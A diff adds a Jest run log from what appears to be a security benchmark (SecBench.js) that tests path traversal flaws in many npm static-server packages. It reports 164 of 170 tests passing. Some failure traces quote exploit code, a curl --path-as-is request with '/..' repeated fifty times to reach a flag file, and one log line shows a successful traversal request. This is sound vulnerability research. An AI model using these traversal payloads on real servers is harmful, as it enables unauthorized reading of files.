+      at Resolver._throwModNotFoundError (../../../../../.npm/_npx/b8d86e6551a4f492/node_modules/jest-resolve/build/index.js:863:11)
+      at Object.<anonymous> (../node_modules/sleep/index.js:1:13)
+      at Object.require (srverqq.test.js:8:19)
+
+Test Suites: 1 failed, 1 total
+Tests:       0 total
+Snapshots:   0 total
+Time:        0.337 s
+Ran all test suites matching path-traversal/srverqq_1.0.0/srverqq.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+TEST FAILED
+path-traversal/open-device_4.0.1/open-device.test.js
+8080/tcp:           
+ PASS  ./open-device.test.js
+  ✓ Path Traversal in open-device (2122 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.467 s
+Ran all test suites matching path-traversal/open-device_4.0.1/open-device.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/open-device_4.0.1/open-device.test.js'], returncode=0)
+TEST PASSED
+path-traversal/nopach_0.1.1/nopach.test.js
+ FAIL  ./nopach.test.js (5.275 s)
+  ✕ Path Traversal in nopach (5003 ms)
+
+  ● Path Traversal in nopach
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: "<!DOCTYPE html>
+    <html>
+    <body>·
+    <h1>CISPA</h1>
+    <p>vulns4js! is here.</p>·
+    </body>
+    </html> "
+    Received: ""
+
+      26 |   let attack_string = `curl -v --path-as-is "http://127.0.0.1:8000${genstr()}"`;
+      27 |   exec(attack_string, (error, stdout) => {
+    > 28 |     expect(stdout).toBe(hostsFile);
+         |                    ^
+      29 |     done();
+      30 |   });
+      31 | });
+
+      at toBe (nopach.test.js:28:20)
+
+  ● Path Traversal in nopach
+
+    thrown: "Exceeded timeout of 5000 ms for a test while waiting for `done()` to be called.
+    Add a timeout value to this test to increase the timeout, if this is a long-running test. See https://jestjs.io/docs/api#testname-fn-timeout."
+
+      11 |   return "/..".repeat(50) + pathToFlag;
+      12 | }
+    > 13 | test("Path Traversal in nopach", (done) => {
+         | ^
+      14 |   expect.assertions(1);
+      15 |   const fs = require("fs");
+      16 |   const sleep = require("sleep");
+
+      at Object.test (nopach.test.js:13:1)
+
+Test Suites: 1 failed, 1 total
+Tests:       1 failed, 1 total
+Snapshots:   0 total
+Time:        5.336 s
+Ran all test suites matching path-traversal/nopach_0.1.1/nopach.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+TEST FAILED
+path-traversal/goserv_1.0.0/goserv.test.js
+8000/tcp:           
+ PASS  ./goserv.test.js
+  ✓ Path Traversal in goserv (2058 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.41 s
+Ran all test suites matching path-traversal/goserv_1.0.0/goserv.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/goserv_1.0.0/goserv.test.js'], returncode=0)
+TEST PASSED
+path-traversal/wangshuai_1.0.0/wangshuai.test.js
+8888/tcp:           
+ PASS  ./wangshuai.test.js
+  ✓ Path Traversal in wangshuai (2068 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.419 s
+Ran all test suites matching path-traversal/wangshuai_1.0.0/wangshuai.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/wangshuai_1.0.0/wangshuai.test.js'], returncode=0)
+TEST PASSED
+path-traversal/augustine_0.2.3/augustine.test.js
+8968/tcp:           
+ PASS  ./augustine.test.js
+  ✓ Path Traversal in augustine (2063 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.434 s
+Ran all test suites matching path-traversal/augustine_0.2.3/augustine.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/augustine_0.2.3/augustine.test.js'], returncode=0)
+TEST PASSED
+path-traversal/hdsdhhksjd_1.0.0/hdsdhhksjd.test.js
+8888/tcp:           
+ PASS  ./hdsdhhksjd.test.js
+  ✓ Path Traversal in hdsdhhksjd (2103 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.509 s
+Ran all test suites matching path-traversal/hdsdhhksjd_1.0.0/hdsdhhksjd.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/hdsdhhksjd_1.0.0/hdsdhhksjd.test.js'], returncode=0)
+TEST PASSED
+path-traversal/static-server-gx_1.2.1/static-server-gx.test.js
+10000/tcp:          
+ PASS  ./static-server-gx.test.js
+  ✓ Path Traversal in static-server-gx (2066 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.419 s
+Ran all test suites matching path-traversal/static-server-gx_1.2.1/static-server-gx.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/static-server-gx_1.2.1/static-server-gx.test.js'], returncode=0)
+TEST PASSED
+path-traversal/exxxxxxxxxxx_1.0.2/exxxxxxxxxxx.test.js
+8080/tcp:           
+ PASS  ./exxxxxxxxxxx.test.js
+  ✓ Path Traversal in exxxxxxxxxxx (2145 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.496 s
+Ran all test suites matching path-traversal/exxxxxxxxxxx_1.0.2/exxxxxxxxxxx.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/exxxxxxxxxxx_1.0.2/exxxxxxxxxxx.test.js'], returncode=0)
+TEST PASSED
+path-traversal/zs123_1.0.0/zs123.test.js
+8888/tcp:           
+ PASS  ./zs123.test.js
+  ✓ Path Traversal in zs123 (2065 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.434 s
+Ran all test suites matching path-traversal/zs123_1.0.0/zs123.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/zs123_1.0.0/zs123.test.js'], returncode=0)
+TEST PASSED
+path-traversal/serveryyl_1.1.0/serveryyl.test.js
+8888/tcp:           
+ PASS  ./serveryyl.test.js
+  ✓ Path Traversal in serveryyl (2079 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.427 s
+Ran all test suites matching path-traversal/serveryyl_1.1.0/serveryyl.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/serveryyl_1.1.0/serveryyl.test.js'], returncode=0)
+TEST PASSED
+path-traversal/myprolyz_1.1.0/myprolyz.test.js
+8889/tcp:           
+ PASS  ./myprolyz.test.js
+  ✓ Path Traversal in myprolyz (2064 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.429 s
+Ran all test suites matching path-traversal/myprolyz_1.1.0/myprolyz.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/myprolyz_1.1.0/myprolyz.test.js'], returncode=0)
+TEST PASSED
+path-traversal/zwserver_0.1.1/zwserver.test.js
+8080/tcp:           
+ PASS  ./zwserver.test.js
+  ✓ Path Traversal in zwserver (2115 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.458 s
+Ran all test suites matching path-traversal/zwserver_0.1.1/zwserver.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/zwserver_0.1.1/zwserver.test.js'], returncode=0)
+TEST PASSED
+path-traversal/cyber-js_1.0.6/cyber-js.test.js
+3000/tcp:           
+ PASS  ./cyber-js.test.js
+  ✓ Path Traversal in cyber-js (2066 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.429 s
+Ran all test suites matching path-traversal/cyber-js_1.0.6/cyber-js.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/cyber-js_1.0.6/cyber-js.test.js'], returncode=0)
+TEST PASSED
+path-traversal/m-server_1.4.0/m-server.test.js
+7000/tcp:           
+ PASS  ./m-server.test.js
+  ✓ Path Traversal in m-server (2054 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.413 s
+Ran all test suites matching path-traversal/m-server_1.4.0/m-server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/m-server_1.4.0/m-server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/canvas-designer_1.2.1/canvas-designer.test.js
+9001/tcp:           
+ PASS  ./canvas-designer.test.js
+  ✓ Path Traversal in canvas-designer (2049 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.447 s
+Ran all test suites matching path-traversal/canvas-designer_1.2.1/canvas-designer.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/canvas-designer_1.2.1/canvas-designer.test.js'], returncode=0)
+TEST PASSED
+path-traversal/serversyysyy_1.1.0/serversyysyy.test.js
+ PASS  ./serversyysyy.test.js
+  ✓ Path Traversal in serversyysyy (2149 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.428 s
+Ran all test suites matching path-traversal/serversyysyy_1.1.0/serversyysyy.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/serversyysyy_1.1.0/serversyysyy.test.js'], returncode=0)
+TEST PASSED
+path-traversal/basic-static_2.0.2/basic-static.test.js
+ PASS  ./basic-static.test.js
+  ✓ Path Traversal in basic-static (52 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.324 s
+Ran all test suites matching path-traversal/basic-static_2.0.2/basic-static.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/basic-static_2.0.2/basic-static.test.js'], returncode=0)
+TEST PASSED
+path-traversal/atropa-ide_0.2.2-2/atropa-ide.test.js
+  console.log
+    Server Started on port 8884
+
+      at Object.start (node_modules/atropa-server/server.js:23:13)
+
+  console.log
+    Press ctrl+c to quit.
+
+      at Object.start (node_modules/atropa-server/server.js:24:13)
+
+ PASS  ./atropa-ide.test.js
+  ✓ Path Traversal in atropa-ide (68 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.338 s
+Ran all test suites matching path-traversal/atropa-ide_0.2.2-2/atropa-ide.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/atropa-ide_0.2.2-2/atropa-ide.test.js'], returncode=0)
+TEST PASSED
+path-traversal/zxyserver_1.0.0/zxyserver.test.js
+8888/tcp:           
+ PASS  ./zxyserver.test.js
+  ✓ Path Traversal in zxyserver (2064 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.407 s
+Ran all test suites matching path-traversal/zxyserver_1.0.0/zxyserver.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/zxyserver_1.0.0/zxyserver.test.js'], returncode=0)
+TEST PASSED
+path-traversal/zhangranbigman_0.0.1/zhangranbigman.test.js
+9999/tcp:           
+ PASS  ./zhangranbigman.test.js
+  ✓ Path Traversal in zhangranbigman (2064 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.441 s
+Ran all test suites matching path-traversal/zhangranbigman_0.0.1/zhangranbigman.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/zhangranbigman_0.0.1/zhangranbigman.test.js'], returncode=0)
+TEST PASSED
+path-traversal/servergmf_1.1.0/servergmf.test.js
+8888/tcp:           
+ PASS  ./servergmf.test.js
+  ✓ Path Traversal in servergmf (2052 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.398 s
+Ran all test suites matching path-traversal/servergmf_1.1.0/servergmf.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/servergmf_1.1.0/servergmf.test.js'], returncode=0)
+TEST PASSED
+path-traversal/nodeaaaaa_1.3.0/nodeaaaaa.test.js
+8888/tcp:           
+ PASS  ./nodeaaaaa.test.js
+  ✓ Path Traversal in nodeaaaaa (2051 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.42 s
+Ran all test suites matching path-traversal/nodeaaaaa_1.3.0/nodeaaaaa.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/nodeaaaaa_1.3.0/nodeaaaaa.test.js'], returncode=0)
+TEST PASSED
+path-traversal/mfrs_1.0.0/mfrs.test.js
+8888/tcp:           
+ PASS  ./mfrs.test.js
+  ✓ Path Traversal in mfrs (2044 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.345 s
+Ran all test suites matching path-traversal/mfrs_1.0.0/mfrs.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/mfrs_1.0.0/mfrs.test.js'], returncode=0)
+TEST PASSED
+path-traversal/pico-static-server_2.3.4/pico-static-server.test.js
+  console.log
+    Static server is listening on port 8982
+
+      at createServer (node_modules/pico-static-server/index.js:130:11)
+
+ PASS  ./pico-static-server.test.js
+  ✓ Path Traversal in pico-static-server (50 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.289 s
+Ran all test suites matching path-traversal/pico-static-server_2.3.4/pico-static-server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/pico-static-server_2.3.4/pico-static-server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/tinyserver_0.1.1/tinyserver.test.js
+8976/tcp:           
+ PASS  ./tinyserver.test.js
+  ✓ Path Traversal in tinyserver (2067 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.374 s
+Ran all test suites matching path-traversal/tinyserver_0.1.1/tinyserver.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/tinyserver_0.1.1/tinyserver.test.js'], returncode=0)
+TEST PASSED
+path-traversal/ptest_1.0.0/ptest.test.js
+8080/tcp:           
+ PASS  ./ptest.test.js
+  ✓ Path Traversal in ptest (2067 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.39 s
+Ran all test suites matching path-traversal/ptest_1.0.0/ptest.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/ptest_1.0.0/ptest.test.js'], returncode=0)
+TEST PASSED
+path-traversal/myserve111_1.1.2/myserve111.test.js
+9999/tcp:           
+ PASS  ./myserve111.test.js
+  ✓ Path Traversal in myserve111 (2050 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.361 s
+Ran all test suites matching path-traversal/myserve111_1.1.2/myserve111.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/myserve111_1.1.2/myserve111.test.js'], returncode=0)
+TEST PASSED
+path-traversal/dcdcdcdcdc_1.0.0/dcdcdcdcdc.test.js
+8888/tcp:           
+ PASS  ./dcdcdcdcdc.test.js
+  ✓ Path Traversal in dcdcdcdcdc (2061 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.399 s
+Ran all test suites matching path-traversal/dcdcdcdcdc_1.0.0/dcdcdcdcdc.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/dcdcdcdcdc_1.0.0/dcdcdcdcdc.test.js'], returncode=0)
+TEST PASSED
+path-traversal/wffserve_1.0.0/wffserve.test.js
+8888/tcp:           
+ PASS  ./wffserve.test.js
+  ✓ Path Traversal in wffserve (2057 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.375 s
+Ran all test suites matching path-traversal/wffserve_1.0.0/wffserve.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/wffserve_1.0.0/wffserve.test.js'], returncode=0)
+TEST PASSED
+path-traversal/datachannel-client_1.0.2/datachannel-client.test.js
+8080/tcp:           
+ PASS  ./datachannel-client.test.js
+  ✓ Path Traversal in datachannel-client (2085 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.453 s
+Ran all test suites matching path-traversal/datachannel-client_1.0.2/datachannel-client.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/datachannel-client_1.0.2/datachannel-client.test.js'], returncode=0)
+TEST PASSED
+path-traversal/fsk-server_0.2.1/fsk-server.test.js
+3001/tcp:           
+ PASS  ./fsk-server.test.js
+  ✓ Path Traversal in fsk-server (2084 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.444 s
+Ran all test suites matching path-traversal/fsk-server_0.2.1/fsk-server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/fsk-server_0.2.1/fsk-server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/fast-http_0.1.3/fast-http.test.js
+  console.log
+    The server is now launch on: http://localhost:8080
+
+      at new module.exports (node_modules/fast-http/index.js:51:13)
+
+  console.log
+    GET:/../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../home/bombe/UniSaarland/Websec-Seminar/SecBench.js/path-traversal/flag.html -> ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../home/bombe/UniSaarland/Websec-Seminar/SecBench.js/path-traversal/flag.html
+
+      at Server.<anonymous> (node_modules/fast-http/index.js:20:28)
+
+  console.log
+    Ok 200
+
+      at node_modules/fast-http/index.js:42:36
+
+ PASS  ./fast-http.test.js
+  ✓ Path Traversal in fast-http (65 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.33 s
+Ran all test suites matching path-traversal/fast-http_0.1.3/fast-http.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/fast-http_0.1.3/fast-http.test.js'], returncode=0)
+TEST PASSED
+path-traversal/aso-server_0.4.3/aso-server.test.js
+ FAIL  ./aso-server.test.js (5.252 s)
+  ✕ Path Traversal in aso-server (5004 ms)
+
+  ● Path Traversal in aso-server
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: "<!DOCTYPE html>
+    <html>
+    <body>·
+    <h1>CISPA</h1>
+    <p>vulns4js! is here.</p>·
+    </body>
+    </html> "
+    Received: ""
+
+      22 |   let attack_string = `curl -v --path-as-is "http://127.0.0.1:3000/f/${genstr()}"`;
+      23 |   exec(attack_string, (error, stdout) => {
+    > 24 |     expect(stdout).toBe(hostsFile);
+         |                    ^
+      25 |     done();
+      26 |   });
+      27 | });
+
+      at toBe (aso-server.test.js:24:20)
+
+  ● Path Traversal in aso-server
+
+    thrown: "Exceeded timeout of 5000 ms for a test while waiting for `done()` to be called.
+    Add a timeout value to this test to increase the timeout, if this is a long-running test. See https://jestjs.io/docs/api#testname-fn-timeout."
+
+      4 |   return "/..".repeat(50) + pathToFlag;
+      5 | }
+    > 6 | test("Path Traversal in aso-server", (done) => {
+        | ^
+      7 |   expect.assertions(1);
+      8 |   var pkg = require('aso-server')
+      9 |   const fs = require("fs");
+
+      at Object.test (aso-server.test.js:6:1)
+
+Test Suites: 1 failed, 1 total
+Tests:       1 failed, 1 total
+Snapshots:   0 total
+Time:        5.312 s
+Ran all test suites matching path-traversal/aso-server_0.4.3/aso-server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+TEST FAILED
+******************************************SUMMARY******************************************
+-------------------------------------------------------------------------------------------
+551.6127986907959 seconds
+TOTAL PASSED =  164 / 170
+TOTAL FAILED =  6
+Failed Tests=====================>
+['path-traversal/glance_3.0.0/glance.test.js', 'path-traversal/node-cxc_1.0.0/node-cxc.test.js', 'path-traversal/express-blinker_0.0.6/express-blinker.test.js', 'path-traversal/srverqq_1.0.0/srverqq.test.js', 'path-traversal/nopach_0.1.1/nopach.test.js', 'path-traversal/aso-server_0.4.3/aso-server.test.js']
+
